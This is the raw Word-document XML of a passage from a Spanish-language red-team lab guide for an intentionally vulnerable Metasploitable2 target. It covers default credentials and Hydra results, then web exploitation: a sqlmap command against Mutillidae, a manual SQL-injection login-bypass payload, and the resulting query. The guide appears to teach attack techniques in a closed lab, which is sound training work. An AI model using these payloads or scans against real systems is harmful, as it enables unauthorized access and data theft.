      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">Limita a 100 contraseñas para no tardar horas. Si default-creds.sh ya encontró </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>msfadmin:msfadmin</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>, este paso es opcional.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30031DB9" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Evidencia</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>generada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7C2578" w14:paraId="6AEF40F6" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3564"/>
          </w:tcPr>
          <w:p w14:paraId="02980DE4" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Archivo</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3564"/>
          </w:tcPr>
          <w:p w14:paraId="1E59827A" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Contenido</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007C2578" w:rsidRPr="005F4B07" w14:paraId="5FE6130C" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="779C0883" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>default-creds-results.txt</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="37FF8034" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="es-GT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005F4B07">
              <w:rPr>
                <w:sz w:val="19"/>
                <w:lang w:val="es-GT"/>
              </w:rPr>
              <w:t>CSV con resultado de cada par</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007C2578" w14:paraId="02251B67" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E9EFF8"/>
          </w:tcPr>
          <w:p w14:paraId="18758A21" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>hydra-results.txt</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E9EFF8"/>
          </w:tcPr>
          <w:p w14:paraId="7040D480" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Credenciales encontradas por Hydra</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6498FD48" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578"/>
    <w:p w14:paraId="510EF56B" w14:textId="742C41F2" w:rsidR="005F4B07" w:rsidRDefault="005F4B07">
      <w:r w:rsidRPr="005F4B07">
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="60EADDF8" wp14:editId="5A5E4313">
            <wp:extent cx="5972810" cy="5685155"/>
            <wp:effectExtent l="0" t="0" r="8890" b="0"/>
            <wp:docPr id="15761839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1839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568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99C35" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="1F3564"/>
        </w:pBdr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="292A810F" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
        <w:spacing w:before="280" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
        </w:rPr>
        <w:t>8. Fase 5 — Explotación web</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EA5F430" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="1F3564"/>
        </w:pBdr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1F95CA2E" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Objetivo:</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Confirmar y explotar vulnerabilidades en las aplicaciones web de Metasploitable2.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5079FA09" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">8.1 SQL </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Injection</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> — Prueba automatizada con </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>sqlmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="727A155E" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">docker exec </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>redteam</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>-kali bash -c "LAB_TARGET=172.20.0.20 bash /root/scripts/phase-5-exploitation/web-sqli.sh"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="509298C8" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="22FBFE36" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Qué hace:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38541105" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>sqlmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> -u "http://172.20.0.20/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>mutillidae</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>index.php?page</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>login.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>" \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C1DB786" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">       --</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>batch</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> --</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>level</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>=2 --</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>risk</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>=1 --</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>forms</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> --</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>dbs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="6B1646D3" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="50A800DE" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">8.2 SQL </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Injection</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> — Confirmación manual (demo visual recomendada)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="583613FF" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Abrir en el navegador del host (no dentro del contenedor):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DAA0530" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>http://172.20.0.20/mutillidae/index.php?page=login.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E95DD53" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="06589FA8" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">En el campo </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Username</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> ingresar el siguiente </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>payload</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10F1B618" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>admin' OR '1'='1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23E363D4" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="65797CD4" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">En </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Password</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> ingresar cualquier texto, por ejemplo:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00B6AF6E" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>cualquiercosa</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="7B74BD57" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="48909D28" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">Hacer clic en </w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Login</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">. La aplicación mostrará el </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>login</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> exitoso y el </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>query</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> SQL ejecutado:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EE9D1C8" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>SELECT * FROM accounts WHERE username='admin' OR '1'='1' AND password='cualquiercosa'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B21E616" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7E849A5A" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">Esto confirma inyección SQL: la condición </w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>'1'='1'</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> siempre es verdadera, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>bypaseando</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> la autenticación.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40227006" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Para mostrar desde línea de comandos (dentro del Kali):</w:t>
      </w:r>
